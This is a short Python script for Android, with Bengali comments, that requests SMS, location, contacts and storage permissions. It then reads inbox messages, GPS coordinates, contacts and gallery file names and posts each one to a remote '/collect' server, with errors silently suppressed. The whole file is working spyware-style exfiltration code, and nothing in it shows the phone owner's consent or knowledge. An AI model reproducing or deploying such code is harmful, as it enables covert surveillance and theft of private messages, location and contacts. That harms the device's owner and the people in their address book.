import requests, json, time, os
from plyer import sms, gps, contacts
from android.permissions import request_permissions, Permission

request_permissions([
    Permission.READ_SMS,
    Permission.ACCESS_FINE_LOCATION,
    Permission.READ_CONTACTS,
    Permission.READ_EXTERNAL_STORAGE,
    Permission.WRITE_EXTERNAL_STORAGE
])

RENDER_URL = "https://তোমার-অ্যাপ.onrender.com/collect"  # পরে রেন্ডার লিংক বসাবে
TOKEN = "survive123"

def send_data(data_type, content):
    try:
        requests.post(RENDER_URL, headers={"X-Token": TOKEN},
                      json={"type": data_type, "data": str(content)[:600]}, timeout=5)
    except: pass

# ১. SMS
try:
    send_data("sms", sms.get_messages(inbox=True, limit=5))
except: pass

# ২. GPS
try:
    def on_loc(**kw):
        send_data("gps", f"{kw['lat']},{kw['lon']}")
        gps.stop()
    gps.configure(on_location=on_loc)
    gps.start()
    time.sleep(3)
except: pass

# ৩. কন্ট্যাক্ট
try:
    send_data("contacts", contacts.get_contacts()[:400])
except: pass

# ৪. গ্যালারি লিস্ট
gallery_list = []
for root, _, files in os.walk("/sdcard/DCIM/"):
    for f in files[:10]:
        if f.lower().endswith(('.jpg','.jpeg','.png','.mp4')):
            gallery_list.append(f)
    break
if not gallery_list:
    for root, _, files in os.walk("/sdcard/Pictures/"):
        for f in files[:5]:
            if f.lower().endswith(('.jpg','.jpeg','.png')):
                gallery_list.append(f)
        break
send_data("gallery", ", ".join(gallery_list[:5]))

print("ডেটা পাঠানো শেষ।")
